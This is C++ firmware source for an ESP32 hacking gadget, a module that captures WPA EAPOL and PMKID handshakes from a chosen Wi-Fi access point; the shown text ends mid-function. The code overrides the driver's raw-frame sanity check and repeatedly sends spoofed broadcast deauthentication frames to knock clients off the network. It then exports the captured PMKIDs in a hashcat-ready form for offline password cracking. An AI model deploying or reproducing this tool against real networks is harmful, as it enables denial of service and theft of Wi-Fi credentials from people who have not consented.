/*
    doomBOX / nyanBOX
    EAPOL / PMKID handshake capture
    Full-frame aware, robust parser, honest UI, serial export
    Copyright (c) 2026 jbohack

    Licensed under the MIT License
    https://opensource.org/licenses/MIT

    SPDX-License-Identifier: MIT
*/

#include "../include/handshake_capture.h"
#include "../include/radio_manager.h"
#include "../include/sleep_manager.h"
#include "../include/pindefs.h"
#include "../include/display_mirror.h"
#include "../include/setting.h"
#include <EEPROM.h>
#include <string.h>
#include <stdio.h>
#include "esp_wifi.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

#define BTN_UP    BUTTON_PIN_UP
#define BTN_DOWN  BUTTON_PIN_DOWN
#define BTN_RIGHT BUTTON_PIN_RIGHT
#define BTN_BACK  BUTTON_PIN_LEFT

extern "C" int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {
    (void)a; (void)b; (void)c;
    return 0;
}

// ---------------------------------------------------------------------------
// EEPROM layout (512-byte EEPROM; region 200+)
// ---------------------------------------------------------------------------
#define HS_EEPROM_BASE   200
#define HS_MAGIC0        0x48
#define HS_MAGIC1        0x53
#define HS_MAX_ENTRIES   2
#define HS_SSID_LEN      33
#define HS_PMKID_LEN     16
#define HS_SNAP_LEN      32   // first bytes of best EAPOL frame kept as evidence

struct __attribute__((packed)) HandshakeEntry {
    uint8_t valid;                  // 1 = used
    uint8_t channel;
    uint8_t bssid[6];
    char    ssid[HS_SSID_LEN];
    uint8_t eapol_count;
    uint8_t flags;                  // bit0=M1, bit1=M2, bit2=has_pmkid
    uint8_t pmkid[HS_PMKID_LEN];    // only valid when flags bit2 set
    uint8_t snap_len;
    uint8_t snap[HS_SNAP_LEN];      // leading bytes of best EAPOL frame
};

static_assert(sizeof(HandshakeEntry) == 92, "HandshakeEntry size");

#define HS_ENTRY_SIZE   (sizeof(HandshakeEntry))
#define HS_COUNT_ADDR   (HS_EEPROM_BASE + 2)
#define HS_ENTRIES_ADDR (HS_EEPROM_BASE + 3)

#define FLAG_M1      0x01
#define FLAG_M2      0x02
#define FLAG_PMKID   0x04

// ---------------------------------------------------------------------------
// Runtime
// ---------------------------------------------------------------------------
enum HsMode {
    HS_MODE_MENU,
    HS_MODE_SCANNING,
    HS_MODE_LIST,
    HS_MODE_CAPTURE,
    HS_MODE_VIEW_LIST,
    HS_MODE_VIEW_DETAIL,
    HS_MODE_SAVED_MSG
};

static HsMode currentMode = HS_MODE_MENU;
static int menuSelection = 0;
static int apIndex = 0;
static int viewIndex = 0;

#define MAX_APS 20
struct AP_Info {
    char ssid[33];
    uint8_t bssid[6];
    int channel;
};
static AP_Info apList[MAX_APS];
static int apCount = 0;

static bool scanInProgress = false;
static uint16_t currentScanCount = 0;
static unsigned long scanStartTime = 0;
static const unsigned long SCAN_DURATION = 8000;

static unsigned long lastDeauthTime = 0;
static unsigned long captureStartTime = 0;
static const unsigned long DEAUTH_FAST = 300;
static const unsigned long DEAUTH_SLOW = 1500;
static const unsigned long AUTO_STOP_MS = 60000;

// Capture state (main loop owns most; callback only sets light flags)
static volatile uint16_t eapolCount = 0;
static volatile bool captureActive = false;
static bool gotM1 = false;
static bool gotM2 = false;
static bool hasPmkid = false;
static uint8_t capturedPmkid[HS_PMKID_LEN];
static uint8_t bestSnap[HS_SNAP_LEN];
static uint8_t bestSnapLen = 0;
static bool deauthStopped = false;

// Lock-free ring buffer hand-off from callback (4 slots for M1-M4 bursts)
#define CANDIDATE_MAX   256
#define CANDIDATE_SLOTS 4
static uint8_t           candidateBuf[CANDIDATE_SLOTS][CANDIDATE_MAX];
static volatile uint16_t candidateLen[CANDIDATE_SLOTS];
static volatile bool     candidateReady[CANDIDATE_SLOTS];
static volatile uint8_t  candWrite = 0;  // next slot callback writes
static volatile uint8_t  candRead  = 0;  // next slot main loop reads

static uint8_t targetBssid[6];
static uint8_t targetChannel = 1;
static char targetSsid[33];

static bool needsRedraw = true;
static HsMode lastMode = HS_MODE_MENU;
static int lastMenuSelection = -1;
static int lastApIndex = -1;
static int lastViewIndex = -1;
static uint16_t lastEapolCount = 0;
static bool lastHasPmkid = false;
static bool lastGotM1 = false;
static bool lastGotM2 = false;
static uint16_t lastScanCount = 0;
static unsigned long lastScanUpdate = 0;
static unsigned long savedMsgUntil = 0;

static uint8_t deauthFrame[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x07, 0x00
};

// ---------------------------------------------------------------------------
// EEPROM
// ---------------------------------------------------------------------------
static void hsEepromInit() {
    if (EEPROM.read(HS_EEPROM_BASE) != HS_MAGIC0 ||
        EEPROM.read(HS_EEPROM_BASE + 1) != HS_MAGIC1) {
        EEPROM.write(HS_EEPROM_BASE, HS_MAGIC0);
        EEPROM.write(HS_EEPROM_BASE + 1, HS_MAGIC1);
        EEPROM.write(HS_COUNT_ADDR, 0);
        for (int i = 0; i < HS_MAX_ENTRIES; i++) {
            int base = HS_ENTRIES_ADDR + i * HS_ENTRY_SIZE;
            for (size_t b = 0; b < HS_ENTRY_SIZE; b++) EEPROM.write(base + b, 0);
        }
        EEPROM.commit();
    }
}

static uint8_t hsLoadCount() {
    uint8_t c = EEPROM.read(HS_COUNT_ADDR);
    return (c > HS_MAX_ENTRIES) ? 0 : c;
}

static void hsReadEntry(int idx, HandshakeEntry &out) {
    memset(&out, 0, sizeof(out));
    if (idx < 0 || idx >= HS_MAX_ENTRIES) return;
    int base = HS_ENTRIES_ADDR + idx * HS_ENTRY_SIZE;
    uint8_t *p = (uint8_t *)&out;
    for (size_t i = 0; i < HS_ENTRY_SIZE; i++) p[i] = EEPROM.read(base + i);
}

static void hsWriteEntry(int idx, const HandshakeEntry &in) {
    if (idx < 0 || idx >= HS_MAX_ENTRIES) return;
    int base = HS_ENTRIES_ADDR + idx * HS_ENTRY_SIZE;
    const uint8_t *p = (const uint8_t *)&in;
    for (size_t i = 0; i < HS_ENTRY_SIZE; i++) EEPROM.write(base + i, p[i]);
}

static void hsClearAll() {
    EEPROM.write(HS_COUNT_ADDR, 0);
    HandshakeEntry blank;
    memset(&blank, 0, sizeof(blank));
    for (int i = 0; i < HS_MAX_ENTRIES; i++) hsWriteEntry(i, blank);
    EEPROM.commit();
}

static void hsSaveCurrentCapture() {
    if (eapolCount == 0) return;

    HandshakeEntry e;
    memset(&e, 0, sizeof(e));
    e.valid = 1;
    e.channel = targetChannel;
    memcpy(e.bssid, targetBssid, 6);
    strncpy(e.ssid, targetSsid, HS_SSID_LEN - 1);
    e.eapol_count = (eapolCount > 255) ? 255 : (uint8_t)eapolCount;
    e.flags = 0;
    if (gotM1) e.flags |= FLAG_M1;
    if (gotM2) e.flags |= FLAG_M2;
    if (hasPmkid) {
        e.flags |= FLAG_PMKID;
        memcpy(e.pmkid, capturedPmkid, HS_PMKID_LEN);
    }
    e.snap_len = bestSnapLen;
    if (bestSnapLen) memcpy(e.snap, bestSnap, bestSnapLen);

    uint8_t count = hsLoadCount();
    int slot;
    if (count < HS_MAX_ENTRIES) {
        slot = count;
        count++;
        EEPROM.write(HS_COUNT_ADDR, count);
    } else {
        for (int i = 0; i < HS_MAX_ENTRIES - 1; i++) {
            HandshakeEntry tmp;
            hsReadEntry(i + 1, tmp);
            hsWriteEntry(i, tmp);
        }
        slot = HS_MAX_ENTRIES - 1;
    }
    hsWriteEntry(slot, e);
    EEPROM.commit();
}

// ---------------------------------------------------------------------------
// Serial export (usable offline)
// ---------------------------------------------------------------------------
static void serialDumpEntry(const HandshakeEntry &e, int idx) {
    Serial.println();
    Serial.printf("--- Handshake slot %d ---\n", idx);
    Serial.printf("SSID: %s\n", e.ssid);
    Serial.printf("BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  e.bssid[0], e.bssid[1], e.bssid[2],
                  e.bssid[3], e.bssid[4], e.bssid[5]);
    Serial.printf("Channel: %u  EAPOL frames: %u\n", e.channel, e.eapol_count);
    Serial.printf("M1: %s  M2: %s  PMKID: %s\n",
                  (e.flags & FLAG_M1) ? "yes" : "no",
                  (e.flags & FLAG_M2) ? "yes" : "no",
                  (e.flags & FLAG_PMKID) ? "yes" : "no");
    if (e.flags & FLAG_PMKID) {
        Serial.print("PMKID: ");
        for (int i = 0; i < HS_PMKID_LEN; i++) Serial.printf("%02x", e.pmkid[i]);
        Serial.println();
        // hashcat 16800-style hint (BSSID + PMKID) – user still needs full context
        Serial.print("PMKID hex: ");
        for (int i = 0; i < HS_PMKID_LEN; i++) Serial.printf("%02x", e.pmkid[i]);
        Serial.print(":");
        for (int i = 0; i < 6; i++) Serial.printf("%02x", e.bssid[i]);
        Serial.println();
    } else {
        Serial.println("PMKID: not present (AP did not send KDE or not captured)");
    }
    if (e.snap_len) {
        Serial.printf("EAPOL snapshot (%u bytes): ", e.snap_len);
        for (int i = 0; i < e.snap_len; i++) Serial.printf("%02x", e.snap[i]);
        Serial.println();
    }
    Serial.println("---");
}

// ---------------------------------------------------------------------------
// Light callback – copy candidate only
// ---------------------------------------------------------------------------
static void IRAM_ATTR snifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!captureActive) return;
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 36 || len > 800) return;

    // BSSID in addr1/addr2/addr3
    if (len >= 24) {
        bool match = false;
        if (memcmp(payload + 4,  targetBssid, 6) == 0) match = true;
        else if (memcmp(payload + 10, targetBssid, 6) == 0) match = true;
        else if (memcmp(payload + 16, targetBssid, 6) == 0) match = true;
        if (!match) return;
    } else return;

    // Quick ethertype search (limited)
    int end = (len < 100) ? (int)len - 1 : 100;
    for (int i = 24; i < end; i++) {
        if (payload[i] == 0x88 && payload[i + 1] == 0x8E) {
            eapolCount++;
            // Enqueue into next free ring slot (drop if full)
            uint8_t w = candWrite;
            uint8_t next = (uint8_t)((w + 1) % CANDIDATE_SLOTS);
            if (next != candRead && !candidateReady[w]) {
                uint16_t cl = len;
                if (cl > CANDIDATE_MAX) cl = CANDIDATE_MAX;
                for (uint16_t k = 0; k < cl; k++) candidateBuf[w][k] = payload[k];
                candidateLen[w] = cl;
                candidateReady[w] = true;
                candWrite = next;
            }
            break;
        }
    }
}

// ---------------------------------------------------------------------------
// Robust main-loop parser
// ---------------------------------------------------------------------------
static int findEapolOffset(const uint8_t *p, uint16_t len) {
    // Search after MAC header; allow QoS and LLC/SNAP
    for (int i = 24; i + 8 < (int)len; i++) {
        if (p[i] == 0x88 && p[i + 1] == 0x8E) return i;
        // LLC/SNAP: AA AA 03 00 00 00 88 8E (OUI must be 00 00 00)
        if (i + 7 < (int)len &&
            p[i] == 0xAA && p[i+1] == 0xAA && p[i+2] == 0x03 &&
            p[i+3] == 0x00 && p[i+4] == 0x00 && p[i+5] == 0x00 &&
            p[i+6] == 0x88 && p[i+7] == 0x8E) return i + 6;
    }
    return -1;
}

static void processOneCandidate(const uint8_t *p, uint16_t len) {
    int off = findEapolOffset(p, len);
    if (off < 0) return;

    // EAPOL: ver(1) type(1) len(2) – type 3 = Key
    if (off + 4 >= (int)len) return;
    if (p[off + 3] != 0x03) return;   // not Key

    // Key Information is big-endian at off+7 (high) / off+8 (low)
    // Layout: ethertype[2] ver[1] type[1] bodylen[2] desc[1] keyinfo[2] ...
    if (off + 8 >= (int)len) return;
    uint16_t keyInfo = ((uint16_t)p[off + 7] << 8) | (uint16_t)p[off + 8];

    bool keyAck  = (keyInfo & 0x0080) != 0;
    bool keyMic  = (keyInfo & 0x0100) != 0;

    if (keyAck && !keyMic) gotM1 = true;
    if (keyMic && !keyAck) gotM2 = true;

    // Keep a snapshot of the first useful EAPOL
    if (bestSnapLen == 0) {
        uint8_t sl = (len > HS_SNAP_LEN) ? HS_SNAP_LEN : (uint8_t)len;
        memcpy(bestSnap, p, sl);
        bestSnapLen = sl;
    }

    // PMKID KDE lives in Key Data, which starts at off+99 after the fixed
    // EAPOL-Key header fields (through MIC and key-data-length).
    if (!hasPmkid && off + 99 < (int)len) {
        uint16_t kdLen = ((uint16_t)p[off + 97] << 8) | (uint16_t)p[off + 98];
        if (kdLen > 0 && (int)off + 99 + (int)kdLen <= (int)len) {
            int kdStart = off + 99;
            int kdEnd   = kdStart + (int)kdLen;
            for (int j = kdStart; j + 22 <= kdEnd; j++) {
                if (p[j] == 0xDD && p[j+1] >= 0x14 &&
                    p[j+2] == 0x00 && p[j+3] == 0x0F &&
                    p[j+4] == 0xAC && p[j+5] == 0x04) {
                    bool nz = false;
                    for (int z = 0; z < HS_PMKID_LEN; z++) {
                        capturedPmkid[z] = p[j + 6 + z];
                        if (capturedPmkid[z]) nz = true;
                    }
                    if (nz) hasPmkid = true;
                    break;
                }
            }
        }
    }
}

static void processCandidates() {
    // Drain all pending ring slots (copy out first to avoid callback race)
    for (;;) {
        uint8_t r = candRead;
        if (!candidateReady[r]) break;

        uint8_t localBuf[CANDIDATE_MAX];
        uint16_t len = candidateLen[r];
        if (len > CANDIDATE_MAX) len = CANDIDATE_MAX;
        memcpy(localBuf, candidateBuf[r], len);
        candidateReady[r] = false;
        candRead = (uint8_t)((candRead + 1) % CANDIDATE_SLOTS);

        processOneCandidate(localBuf, len);
    }
}

// ---------------------------------------------------------------------------
// Radio
// ---------------------------------------------------------------------------
// clientMac: if non-NULL and not broadcast, used as addr1 (targeted deauth).
//            if NULL, falls back to broadcast FF:FF:FF:FF:FF:FF.
static void sendDeauthBurst(const uint8_t *clientMac) {
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    const uint8_t *dst = (clientMac != NULL) ? clientMac : bcast;
    memcpy(deauthFrame + 4,  dst, 6);          // addr1 = destination (client or broadcast)
    memcpy(deauthFrame + 10, targetBssid, 6);  // addr2 = AP
    memcpy(deauthFrame + 16, targetBssid, 6);  // addr3 = BSSID
    for (int i = 0; i < 3; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
        delay(1);
    }
}

static void stopCaptureRadio() {
    captureActive = false;
    for (int i = 0; i < CANDIDATE_SLOTS; i++) candidateReady[i] = false;
    candWrite = 0;
    candRead = 0;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    delay(30);
}

static void startScan() {
    if (scanInProgress) return;
    apCount = 0;
    currentScanCount = 0;
    scanInProgress = true;
    currentMode = HS_MODE_SCANNING;
    needsRedraw = true;

    stopCaptureRadio();
    initWiFi(WIFI_MODE_APSTA);
    delay(40);

    wifi_scan_config_t cfg = {};
    cfg.scan_type = WIFI_SCAN_TYPE_ACTIVE;
    cfg.show_hidden = false;
    cfg.scan_time.active.min = 120;
    cfg.scan_time.active.max = 200;
    esp_wifi_scan_start(&cfg, false);
    scanStartTime = millis();
}

static void processScanResults() {
    uint16_t number = 0;
    esp_wifi_scan_get_ap_num(&number);
    if (number > 0) {
        wifi_ap_record_t *recs = (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t) * number);
        if (recs) {
            memset(recs, 0, sizeof(wifi_ap_record_t) * number);
            uint16_t actual = number;
            if (esp_wifi_scan_get_ap_records(&actual, recs) == ESP_OK) {
                apCount = 0;
                for (int i = 0; i < (int)actual && apCount < MAX_APS; i++) {
                    if (recs[i].ssid[0] == 0) continue;
                    strncpy(apList[apCount].ssid, (const char *)recs[i].ssid, 32);
                    apList[apCount].ssid[32] = '\0';
                    memcpy(apList[apCount].bssid, recs[i].bssid, 6);
                    apList[apCount].channel = recs[i].primary;
                    apCount++;
                }
            }
            free(recs);
        }
    }
    scanInProgress = false;
    apIndex = 0;
    currentMode = HS_MODE_LIST;
    needsRedraw = true;
}

// ---------------------------------------------------------------------------
// Drawing
// ---------------------------------------------------------------------------
static void drawMenu() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Handshake Capture");
    u8g2.drawStr(0, 28, menuSelection == 0 ? "> Capture" : "  Capture");
    u8g2.drawStr(0, 42, menuSelection == 1 ? "> View Saved" : "  View Saved");
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 62, "U/D R=Select");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

static void drawScanning() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Scanning APs...");
    char buf[24];
    snprintf(buf, sizeof(buf), "Found: %u", (unsigned)currentScanCount);
    u8g2.drawStr(0, 28, buf);
    u8g2.drawFrame(0, 40, 128, 10);
    int fill = (int)(((millis() - scanStartTime) * 124) / SCAN_DURATION);
    if (fill > 124) fill = 124;
    if (fill > 0) u8g2.drawBox(2, 42, fill, 6);
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 62, "Please wait");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

static void drawList() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Select AP:");
    if (apCount == 0) {
        u8g2.drawStr(0, 28, "No networks found");
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 62, "L=Back");
    } else {
        int start = apIndex > 0 ? apIndex - 1 : 0;
        if (apIndex == apCount - 1 && apCount > 2) start = apCount - 3;
        if (start < 0) start = 0;
        for (int i = 0; i < 3; i++) {
            int idx = start + i;
            if (idx >= apCount) break;
            char line[22], shortS[16];
            strncpy(shortS, apList[idx].ssid, 15);
            shortS[15] = '\0';
            snprintf(line, sizeof(line), "%s%s", idx == apIndex ? ">" : " ", shortS);
            u8g2.drawStr(0, 24 + i * 12, line);
        }
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 62, "U/D R=Start L=Back");
    }
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

static void drawCapture() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    char shortS[18];
    strncpy(shortS, targetSsid, 17);
    shortS[17] = '\0';
    u8g2.drawStr(0, 10, shortS);

    char buf[32];
    snprintf(buf, sizeof(buf), "Ch:%d EAPOL:%u", targetChannel, (unsigned)eapolCount);
    u8g2.drawStr(0, 22, buf);

    snprintf(buf, sizeof(buf), "M1:%s M2:%s", gotM1 ? "Y" : "-", gotM2 ? "Y" : "-");
    u8g2.drawStr(0, 34, buf);

    if (hasPmkid) {
        u8g2.drawStr(0, 46, "PMKID: YES");
    } else if (gotM1 || gotM2) {
        u8g2.drawStr(0, 46, "PMKID: none (EAPOL ok)");
    } else {
        u8g2.drawStr(0, 46, deauthStopped ? "Deauth: slow" : "Deauth: active");
    }

    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 62, "L=Save&Stop");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

static void drawSavedMsg() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(24, 24, "Saved!");
    if (hasPmkid) u8g2.drawStr(8, 42, "PMKID included");
    else if (gotM1 || gotM2) u8g2.drawStr(4, 42, "EAPOL only (no PMKID)");
    else u8g2.drawStr(16, 42, "Weak capture");
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 58, "Serial has full dump");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

static void drawViewList() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Saved Handshakes");
    uint8_t count = hsLoadCount();
    if (count == 0) {
        u8g2.drawStr(0, 28, "No captures yet");
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 62, "L=Back");
    } else {
        if (viewIndex >= count) viewIndex = count - 1;
        int start = viewIndex > 0 ? viewIndex - 1 : 0;
        if (viewIndex == count - 1 && count > 2) start = count - 3;
        if (start < 0) start = 0;
        for (int i = 0; i < 3; i++) {
            int idx = start + i;
            if (idx >= count) break;
            HandshakeEntry e;
            hsReadEntry(idx, e);
            char line[22], shortS[12];
            strncpy(shortS, e.ssid, 11);
            shortS[11] = '\0';
            char mark = (e.flags & FLAG_PMKID) ? '*' : ((e.flags & (FLAG_M1|FLAG_M2)) ? '+' : ' ');
            snprintf(line, sizeof(line), "%s%s%c", idx == viewIndex ? ">" : " ", shortS, mark);
            u8g2.drawStr(0, 24 + i * 12, line);
        }
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 62, "U/D R=Detail L=Back");
    }
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

static void drawViewDetail() {
    HandshakeEntry e;
    hsReadEntry(viewIndex, e);
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);

    char shortS[22];
    strncpy(shortS, e.ssid, 21);
    shortS[21] = '\0';
    u8g2.drawStr(0, 8, shortS);

    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             e.bssid[0], e.bssid[1], e.bssid[2],
             e.bssid[3], e.bssid[4], e.bssid[5]);
    char masked[18];
    maskMAC(mac, masked);
    u8g2.drawStr(0, 18, masked);

    char info[32];
    snprintf(info, sizeof(info), "Ch:%d EAPOL:%u M1:%s M2:%s",
             e.channel, e.eapol_count,
             (e.flags & FLAG_M1) ? "Y" : "-",
             (e.flags & FLAG_M2) ? "Y" : "-");
    u8g2.drawStr(0, 28, info);

    if (e.flags & FLAG_PMKID) {
        u8g2.drawStr(0, 38, "PMKID (valid):");
        char h1[20], h2[20];
        snprintf(h1, sizeof(h1), "%02X%02X%02X%02X%02X%02X%02X%02X",
                 e.pmkid[0], e.pmkid[1], e.pmkid[2], e.pmkid[3],
                 e.pmkid[4], e.pmkid[5], e.pmkid[6], e.pmkid[7]);
        snprintf(h2, sizeof(h2), "%02X%02X%02X%02X%02X%02X%02X%02X",
                 e.pmkid[8], e.pmkid[9], e.pmkid[10], e.pmkid[11],
                 e.pmkid[12], e.pmkid[13], e.pmkid[14], e.pmkid[15]);
        u8g2.drawStr(0, 48, h1);
        u8g2.drawStr(0, 58, h2);
    } else {
        u8g2.drawStr(0, 40, "PMKID: not present");
        u8g2.drawStr(0, 52, "EAPOL data kept");
        u8g2.drawStr(0, 62, "L=Back (Serial dump)");
    }
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------
void handshakeCaptureSetup() {
    initWiFi(WIFI_MODE_APSTA);
    stopCaptureRadio();

    pinMode(BTN_UP, INPUT_PULLUP);
    pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_BACK, INPUT_PULLUP);
    pinMode(BTN_RIGHT, INPUT_PULLUP);

    hsEepromInit();

    currentMode = HS_MODE_MENU;
    menuSelection = 0;
    apIndex = 0;
    viewIndex = 0;
    apCount = 0;
    eapolCount = 0;
    hasPmkid = false;
    gotM1 = false;
    gotM2 = false;
    bestSnapLen = 0;
    captureActive = false;
    scanInProgress = false;
    deauthStopped = false;
    for (int i = 0; i < CANDIDATE_SLOTS; i++) candidateReady[i] = false;
    candWrite = 0;
    candRead = 0;
    memset(capturedPmkid, 0, sizeof(capturedPmkid));

    needsRedraw = true;
    lastMode = HS_MODE_MENU;
    lastMenuSelection = -1;
    lastApIndex = -1;
    lastViewIndex = -1;
    lastEapolCount = 0;
    lastHasPmkid = false;
    lastGotM1 = false;
    lastGotM2 = false;
    lastScanCount = 0;
}

void handshakeCaptureLoop() {
    updateLastActivity();
    unsigned long now = millis();

    if (currentMode == HS_MODE_SCANNING) {
        esp_wifi_scan_get_ap_num(&currentScanCount);
        if (currentScanCount != lastScanCount || now - lastScanUpdate >= 100) {
            lastScanCount = currentScanCount;
            lastScanUpdate = now;
            needsRedraw = true;
        }
        if (needsRedraw) { drawScanning(); needsRedraw = false; }
        if (now - scanStartTime > SCAN_DURATION) processScanResults();
        return;
    }

    if (currentMode == HS_MODE_SAVED_MSG) {
        if (now >= savedMsgUntil) {
            currentMode = HS_MODE_LIST;
            needsRedraw = true;
        } else if (needsRedraw) {
            drawSavedMsg();
            needsRedraw = false;
        }
        return;
    }

    if (captureActive) processCandidates();

    bool up    = digitalRead(BTN_UP) == LOW;
    bool down  = digitalRead(BTN_DOWN) == LOW;
    bool left  = digitalRead(BTN_BACK) == LOW;
    bool right = digitalRead(BTN_RIGHT) == LOW;

    switch (currentMode) {
    case HS_MODE_MENU:
        if (up || down) { menuSelection ^= 1; needsRedraw = true; delay(180); }
        if (right) {
            if (menuSelection == 0) startScan();
            else { currentMode = HS_MODE_VIEW_LIST; viewIndex = 0; needsRedraw = true; }
            delay(180);
        }
        break;

    case HS_MODE_LIST:
        if (up && apCount) { apIndex = (apIndex - 1 + apCount) % apCount; needsRedraw = true; delay(180); }
        if (down && apCount) { apIndex = (apIndex + 1) % apCount; needsRedraw = true; delay(180); }
        if (right && apCount) {
            strncpy(targetSsid, apList[apIndex].ssid, sizeof(targetSsid) - 1);
            targetSsid[sizeof(targetSsid) - 1] = '\0';
            memcpy(targetBssid, apList[apIndex].bssid, 6);
            targetChannel = apList[apIndex].channel;

            eapolCount = 0;
            hasPmkid = false;
            gotM1 = false;
            gotM2 = false;
            bestSnapLen = 0;
            deauthStopped = false;
            for (int i = 0; i < CANDIDATE_SLOTS; i++) candidateReady[i] = false;
            candWrite = 0;
            candRead = 0;
            memset(capturedPmkid, 0, sizeof(capturedPmkid));
            memset(bestSnap, 0, sizeof(bestSnap));

            initWiFi(WIFI_MODE_APSTA);
            delay(30);
            esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
            esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
            wifi_promiscuous_filter_t filt = {};
            filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
            esp_wifi_set_promiscuous_filter(&filt);
            esp_wifi_set_promiscuous(true);
            captureActive = true;

            currentMode = HS_MODE_CAPTURE;
            captureStartTime = now;
            lastDeauthTime = 0;
            needsRedraw = true;
            delay(180);
        }
        if (left) { currentMode = HS_MODE_MENU; needsRedraw = true; delay(180); }
        break;

    case HS_MODE_CAPTURE: {
        if (left) {
            stopCaptureRadio();
            if (eapolCount > 0) {
                hsSaveCurrentCapture();
                // Dump to serial immediately
                HandshakeEntry tmp;
                // Re-read last written roughly via current state for serial
                Serial.println(F("\n=== Capture saved ==="));
                Serial.printf("SSID: %s\n", targetSsid);
                Serial.printf("BSSID: %02X:%02X:%02X:%02X:%02X:%02X  Ch:%u\n",
                              targetBssid[0], targetBssid[1], targetBssid[2],
                              targetBssid[3], targetBssid[4], targetBssid[5],
                              targetChannel);
                Serial.printf("EAPOL: %u  M1:%s M2:%s PMKID:%s\n",
                              (unsigned)eapolCount,
                              gotM1 ? "Y" : "N", gotM2 ? "Y" : "N",
                              hasPmkid ? "Y" : "N");
                if (hasPmkid) {
                    Serial.print("PMKID: ");
                    for (int i = 0; i < 16; i++) Serial.printf("%02x", capturedPmkid[i]);
                    Serial.println();
                }
                savedMsgUntil = now + 1500;
                currentMode = HS_MODE_SAVED_MSG;
            } else {
                currentMode = HS_MODE_LIST;
            }
            needsRedraw = true;
            delay(180);
            break;
        }

        if (now - captureStartTime > AUTO_STOP_MS) {
            stopCaptureRadio();
            if (eapolCount > 0) {
                hsSaveCurrentCapture();
                savedMsgUntil = now + 1500;
                currentMode = HS_MODE_SAVED_MSG;
            } else currentMode = HS_MODE_LIST;
            needsRedraw = true;
            break;
        }

        bool success = hasPmkid || (gotM1 && gotM2);
        if (success && !deauthStopped) {
            deauthStopped = true;
            needsRedraw = true;
        }

        unsigned long interval = deauthStopped ? DEAUTH_SLOW : DEAUTH_FAST;
        if (now - lastDeauthTime >= interval) {
            lastDeauthTime = now;
            if (!deauthStopped) sendDeauthBurst(NULL);
            else if (((now / 2000) & 1) == 0) sendDeauthBurst(NULL);
        }

        if (eapolCount != lastEapolCount || hasPmkid != lastHasPmkid ||
            gotM1 != lastGotM1 || gotM2 != lastGotM2) {
            lastEapolCount = eapolCount;
            lastHasPmkid = hasPmkid;
            lastGotM1 = gotM1;
            lastGotM2 = gotM2;
            needsRedraw = true;
        }
        break;
    }

    case HS_MODE_VIEW_LIST: {
        uint8_t count = hsLoadCount();
        if (up && count) { viewIndex = (viewIndex - 1 + count) % count; needsRedraw = true; delay(180); }
        if (down && count) { viewIndex = (viewIndex + 1) % count; needsRedraw = true; delay(180); }
        if (right && count) {
            currentMode = HS_MODE_VIEW_DETAIL;
            // Dump to serial when opening detail
            HandshakeEntry e;
            hsReadEntry(viewIndex, e);
            serialDumpEntry(e, viewIndex);
            needsRedraw = true;
            delay(180);
        }
        if (up && down && count) {
            hsClearAll();
            viewIndex = 0;
            needsRedraw = true;
            delay(400);
        }
        if (left) { currentMode = HS_MODE_MENU; needsRedraw = true; delay(180); }
        break;
    }

    case HS_MODE_VIEW_DETAIL:
        if (left) { currentMode = HS_MODE_VIEW_LIST; needsRedraw = true; delay(180); }
        break;

    default:
        break;
    }

    if (currentMode != lastMode) { lastMode = currentMode; needsRedraw = true; }
    if (menuSelection != lastMenuSelection) { lastMenuSelection = menuSelection; needsRedraw = true; }
    if (apIndex != lastApIndex) { lastApIndex = apIndex; needsRedraw = true; }
